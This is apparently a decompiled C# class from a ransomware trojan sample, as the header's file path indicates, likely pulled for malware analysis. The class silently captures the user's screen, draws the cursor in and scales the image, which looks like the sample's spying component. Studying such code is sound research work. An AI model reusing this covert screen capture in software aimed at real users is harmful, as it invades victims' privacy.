// Decompiled with JetBrains decompiler
// Type: thnaviwa.WSCRNS
// Assembly: thnaviwa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66A6D437-741C-49E8-8392-5835C756DC2C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-98894973a86aa01c4f7496ae339dc73b5e6da2f1dbcd5fe1215f70ea7b889b85.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace thnaviwa
{
  internal class WSCRNS
  {
    private const int thnaviwaCURSOR_SHOWING = 1;

    [DllImport("user32.dll")]
    private static extern bool GetCursorInfo(out WSCRNS.CURSORINFO pci);

    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

    public Bitmap thnaviwascreen(int mheight)
    {
      bool flag = true;
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int width1 = bounds.Width;
      bounds = Screen.PrimaryScreen.Bounds;
      int height1 = bounds.Height;
      Bitmap original = new Bitmap(width1, height1, PixelFormat.Format24bppRgb);
      try
      {
        using (Graphics graphics = Graphics.FromImage((Image) original))
        {
          graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
          if (flag)
          {
            WSCRNS.CURSORINFO pci;
            pci.cbSize = Marshal.SizeOf(typeof (WSCRNS.CURSORINFO));
            if (WSCRNS.GetCursorInfo(out pci) && pci.flags == 1)
            {
              WSCRNS.DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
              graphics.ReleaseHdc();
            }
          }
        }
      }
      catch
      {
        return (Bitmap) null;
      }
      int height2 = original.Height * (mheight * 100 / original.Height) / 100;
      int width2 = mheight + mheight * 100 / original.Width * mheight / 100 + 100;
      return new Bitmap((Image) original, new Size(width2, height2));
    }

    private struct POINTAPI
    {
      public int x;
      public int y;
    }

    private struct CURSORINFO
    {
      public int cbSize;
      public int flags;
      public IntPtr hCursor;
      public WSCRNS.POINTAPI ptScreenPos;
    }
  }
}
